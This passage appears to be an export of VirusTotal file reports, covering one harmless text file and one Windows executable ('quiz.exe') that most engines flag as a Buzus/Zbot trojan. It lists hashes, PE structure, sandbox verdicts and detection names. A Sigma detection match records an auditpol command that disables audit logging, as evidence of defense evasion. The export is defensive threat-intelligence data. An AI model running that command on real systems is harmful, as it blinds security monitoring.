          "engine_version": "1.1.23070.1005",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Google": {
          "category": "failure",
          "engine_name": "Google",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230801"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.120",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-08-18.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230815"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230816"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Yandex": {
          "category": "failure",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.8.8378.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230818"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      },
      "sha256": "ef537f25c895bfa782526529a9b63d97aa631564d5d789c2b765448c8635fb6c",
      "tags": [
        "text"
      ],
      "last_analysis_date": 1692396121,
      "unique_sources": 3,
      "first_submission_date": 1549972286,
      "ssdeep": "3:FJKKIUKac5:FHIGo",
      "md5": "e4d909c290d0fb1ca068ffaddf22cbd0",
      "sha1": "408d94384216f890ff7a0c3528e8bed1e0b01621",
      "magic": "ASCII text, with no line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 3,
        "malicious": 0,
        "undetected": 56
      },
      "meaningful_name": "first_file.txt",
      "reputation": 3
    },
    "type": "file",
    "id": "ef537f25c895bfa782526529a9b63d97aa631564d5d789c2b765448c8635fb6c",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/ef537f25c895bfa782526529a9b63d97aa631564d5d789c2b765448c8635fb6c"
    }
  }
},
{
  "_id": {
    "$oid": "65a91be147b5ba6c0a890801"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T152F3F194BAD4C172D41188F5CD01E9BBBA253FB0BD5650437AA5FF8E38B26C1A32447B",
      "vhash": "0150866d1c0d1c0515657az1az3bz1fz",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "creation_date": 708992537,
      "names": [
        "quiz.exe",
        "zeus_45.txt"
      ],
      "last_modification_date": 1704627090,
      "type_tag": "peexe",
      "times_submitted": 9,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 160768,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.buzus/midie",
        "popular_threat_category": [
          {
            "count": 23,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 6,
            "value": "buzus"
          },
          {
            "count": 6,
            "value": "midie"
          },
          {
            "count": 3,
            "value": "delfinject"
          }
        ]
      },
      "authentihash": "1c6d6689f78610a26cd1f2393b051a469d61b6a2e4d2c896c80aaf22f72959c6",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "3.00a-3.70a",
            "type": "Protector",
            "name": "Armadillo"
          },
          {
            "info": "Armadillo 3.00",
            "version": "0.1",
            "type": "Protector",
            "name": "HidePE by BGCorp"
          },
          {
            "version": "6-7 or 2005",
            "type": "Compiler",
            "name": "Borland Delphi"
          },
          {
            "info": "GUI32",
            "version": "2.25*,Delphi",
            "type": "Linker",
            "name": "Turbo Linker"
          }
        ]
      },
      "last_submission_date": 1704627089,
      "sigma_analysis_results": [
        {
          "rule_title": "Audit Policy Tampering Via Auditpol",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Users\\sandbox\\AppData\\Local\\Programs\\Python\\Python38-32\\pythonw.exe",
                "Description": "Audit Policy Program",
                "CurrentDirectory": "C:\\tmp5bxyhabf\\",
                "Image": "C:\\Windows\\SysWOW64\\auditpol.exe",
                "Company": "Microsoft Corporation",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Users\\sandbox\\AppData\\Local\\Programs\\Python\\Python38-32\\pythonw.exe C:/tmp5bxyhabf/analyzer.py",
                "Hashes": "MD5=B2575F09B1842015AA2F4A6679B8F611,SHA256=CB2D78BEBD59368EFFB6BB7F2399C0408C0B82990C10C17B62BBD7DC73143A2E,IMPHASH=22D602C3D8E6F25ECB33FDE5F8427BD0",
                "CommandLine": "auditpol /set /subcategory:\"Sensitive Privilege Use\" /success:disable /failure:disable",
                "OriginalFileName": "AUDITPOL.EXE",
                "FileVersion": "6.1.7601.24335 (win7sp1_ldr_escrow.181228-0954)"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "33a4a18ae1a3802586c239be79075294541594b5b603c230af39618577e03fae",
          "rule_author": "Janantha Marasinghe (https://github.com/blueteam0ps)",
          "rule_description": "Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n"
        }
      ],
      "meaningful_name": "quiz.exe",
      "trid": [
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 35.7
        },
        {
          "file_type": "Win16/32 Executable Delphi generic",
          "probability": 16.4
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 16
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 15.8
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 15.8
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 1,
          "medium": 0,
          "critical": 0,
          "low": 0
        }
      },
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "harmless",
          "confidence": 1,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "CLEAN"
          ]
        },
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        },
        "Tencent HABO": {
          "category": "malicious",
          "sandbox_name": "Tencent HABO",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ]
        }
      },
      "sha256": "5c91e90a547e598c68f6ab7a607149e53872feac28386ffc3bea8d00fd1abed6",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "overlay",
        "armadillo",
        "detect-debug-environment"
      ],
      "last_analysis_date": 1701758871,
      "unique_sources": 5,
      "first_submission_date": 1265544689,
      "sha1": "49a6245c789982f3e6b425dfd6878dc45f388594",
      "ssdeep": "3072:ztTuduxLiGy9xbhBzHnb3hrFGcHknIhqOQilRWkXbLrL:zBhiJ97BzHb3acEIhqcymbz",
      "packers": {
        "PEiD": "* PseudoSigner 0.2 [Armadillo 3.00] --> Anorganix"
      },
      "md5": "66213afc42b9176391f5a1abe6787b45",
      "pe_info": {
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "entropy": 7.992456912994385,
            "chi2": 663.36,
            "filetype": "unknown",
            "sha256": "37ac4c897451d12a5e665bde36dac7ce1dc21534ee3db7b61b503a23f64076ac",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.16391783952713013,
            "chi2": 1469438.75,
            "filetype": "unknown",
            "sha256": "a245df495de4552b21fb7cba1494561a8d2a62d50afc4c081e2d5e354173879d",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 3.7014286518096924,
            "chi2": 288368.06,
            "filetype": "unknown",
            "sha256": "d4fb3807feaa40c80d05506334bee805069c8b96eb92f036eae3ee06a48d8eae",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4,
            "chi2": 240,
            "filetype": "unknown",
            "sha256": "88d14cc6638af8a0836f6d868dfab60df92907a2d7becaefbbd7e007acb75610",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.166110038757324,
            "chi2": 2037.14,
            "filetype": "unknown",
            "sha256": "0ffeac7918cf4f210fd775c7cafda292d82cc0e06618fdbe16bd81617faa0231",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 1.8332061767578125,
            "chi2": 2028,
            "filetype": "ICO",
            "sha256": "9a8d97086a0bf79275f783d6ca70b88d02f2f9715049802f969ba6b4ae971789",
            "type": "RT_GROUP_ICON"
          }
        ],
        "resource_types": {
          "RT_ICON": 1,
          "RT_CURSOR": 2,
          "RT_RCDATA": 2,
          "RT_GROUP_ICON": 1
        },
        "imphash": "abedd3db3def732e4a4682d261a43882",
        "overlay": {
          "entropy": 7.403001308441162,
          "offset": 99840,
          "chi2": 57681.24,
          "filetype": "unknown",
          "size": 60928,
          "md5": "0721aaa8ece1958928c9e83e8a2c5917"
        },
        "resource_langs": {
          "NEUTRAL": 6
        },
        "machine_type": 332,
        "timestamp": 708992537,
        "entry_point": 24640,
        "sections": [
          {
            "name": "CODE",
            "chi2": 229908.34,
            "virtual_address": 4096,
            "entropy": 6.13,
            "raw_size": 20992,
            "flags": "rx",
            "virtual_size": 20992,
            "md5": "df9abb3c6638d8c86b83dcd390197728"
          },
          {
            "name": "DATA",
            "chi2": 43049,
            "virtual_address": 28672,
            "entropy": 3.04,
            "raw_size": 512,
            "flags": "rw",
            "virtual_size": 368,
            "md5": "e47532dc33737cdd2686f0299b049bff"
          },
          {
            "name": "BSS",
            "chi2": -1,
            "virtual_address": 32768,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rw",
            "virtual_size": 8689,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".idata",
            "chi2": 83193,
            "virtual_address": 45056,
            "entropy": 3.27,
            "raw_size": 1024,
            "flags": "rw",
            "virtual_size": 702,
            "md5": "2da4c0928dc1ba5ff5e6bbe3edab764b"
          },
          {
            "name": ".tls",
            "chi2": -1,
            "virtual_address": 49152,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rw",
            "virtual_size": 8,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".rdata",
            "chi2": 125001,
            "virtual_address": 53248,
            "entropy": 0.2,
            "raw_size": 512,
            "flags": "rs",
            "virtual_size": 24,
            "md5": "96a90ecd697b022278d1e11d8a12f44a"
          },
          {
            "name": ".reloc",
            "chi2": 21013.75,
            "virtual_address": 57344,
            "entropy": 6.19,
            "raw_size": 2048,
            "flags": "rs",
            "virtual_size": 1760,
            "md5": "78d76470c91fec271f43e1b0d12f01e5"
          },
          {
            "name": ".rsrc",
            "chi2": 256728.55,
            "virtual_address": 61440,
            "entropy": 7.54,
            "raw_size": 73728,
            "flags": "rs",
            "virtual_size": 73252,
            "md5": "157959a2c88a004e08c81dac3b13771b"
          }
        ],
        "import_list": [
          {
            "library_name": "kernel32.dll",
            "imported_functions": [
              "ExitProcess",
              "FreeLibrary",
              "GetCurrentThreadId",
              "GetModuleHandleA",
              "GetProcessHeap",
              "GlobalAlloc",
              "GlobalLock",
              "GlobalSize",
              "GlobalUnlock",
              "HeapAlloc",
              "HeapFree",
              "HeapReAlloc",
              "LoadLibraryA",
              "LocalAlloc",
              "lstrlenW",
              "MultiByteToWideChar",
              "RaiseException",
              "RtlUnwind",
              "TlsGetValue",
              "TlsSetValue",
              "UnhandledExceptionFilter",
              "WideCharToMultiByte"
            ]
          },
          {
            "library_name": "oleaut32.dll",
            "imported_functions": [
              "SysAllocStringLen",
              "SysFreeString",
              "SysReAllocStringLen"
            ]
          },
          {
            "library_name": "user32.dll",
            "imported_functions": [
              "MessageBoxA"
            ]
          }
        ]
      },
      "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 63,
        "undetected": 9
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W32.AIDetectMalware",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Xtreme.ldwI",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.119",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20231129"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Win32.HLLP.cc",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Gen:Variant.Midie.77868",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Gen:Variant.Midie.77868",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Suspicious.Win32.Save.ins",
          "method": "blacklist",
          "engine_update": "20231122"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.130.50390",
          "result": "Trojan ( 00100a2b1 )",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "VirTool:Win32/DelfInject.d1ebd292",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.130.50390",
          "result": "Trojan ( 00100a2b1 )",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Cybereason": {
          "category": "malicious",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": "malicious.c78998",
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.592",
          "result": "Backdoor.Win32.SdBot.HJG",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "ML.Attribute.HighConfidence",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "tehtris": {
          "category": "malicious",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": "Generic.Malware",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28348",
          "result": "a variant of Win32/Injector.AHZ",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.478",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20231128"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Win.Trojan.Buzus-7330",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.Win32.Generic",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Gen:Variant.Midie.77868",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Win32.Sdbot.fkhgry",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Gen:Variant.Midie.77868",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win32:Inject-XW [Trj]",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Malware.Win32.Gencirc.13bd0390",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Gen:Variant.Midie.77868 (B)",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan.TR/Delfi.pvj",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "BackDoor.IRC.Sdbot.4972",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5007",
          "result": "Trojan.Buzus.Win32.23143",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TrojanSpy.Win32.ZBOT.CDP",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Trapmine": {
          "category": "malicious",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": "malicious.high.ml.score",
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Generic.mg.66213afc42b91763",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Mal/ZAccess-BL",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": "Static AI - Malicious PE",
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36925B:27.34100",
          "result": "Win32.Trojan.Buzus.C",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan/Buzus.rzd",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "Vir.Tool.Gen",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W32/Risk.KDMH-6410",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "TR/Delfi.pvj",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=100)",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Worm[P2P]/Win32.Palevo",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Win32.Trojan.Generic.a",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.150.174",
          "result": "Ransom.Win32.Zbot.oa!s1",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36232",
          "result": "Malware@#1ddt9rriy9krp",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Midie.D1302C",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Win32.Generic",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231204-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23100.2009",
          "result": "VirTool:Win32/DelfInject.gen!BI",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1700731866",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231121"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Artemis!66213AFC42B9",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "TACHYON": {
          "category": "malicious",
          "engine_name": "TACHYON",
          "engine_version": "2023-12-05.01",
          "result": "Trojan/W32.Buzus.160768.P",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "BScope.Trojan.Palevo.011",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Generic.Malware/Suspicious",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Generic Malware",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TrojanSpy.Win32.ZBOT.CDP",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.Win32.DelfInject.an (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Trojan.GenAsa!rwSdcS8FLts",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Delf",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.7164915.susgen",
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "W32/Buzus.DCKP!tr",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "BitDefenderTheta": {
          "category": "malicious",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": "AI:Packer.EE4F2AE91E",
          "method": "blacklist",
          "engine_update": "20231127"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win32:Inject-XW [Trj]",
          "method": "blacklist",
          "engine_update": "20231205"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20231203"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20220812"
        }
      },
      "reputation": 0,
      "sigma_analysis_stats": {
        "high": 1,
        "medium": 0,
        "critical": 0,
        "low": 0
      }
    },
    "type": "file",
    "id": "5c91e90a547e598c68f6ab7a607149e53872feac28386ffc3bea8d00fd1abed6",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/5c91e90a547e598c68f6ab7a607149e53872feac28386ffc3bea8d00fd1abed6"
    }
  },
  "mitre": {
    "data": {
      "CAPE Sandbox": {
        "tactics": [
          {
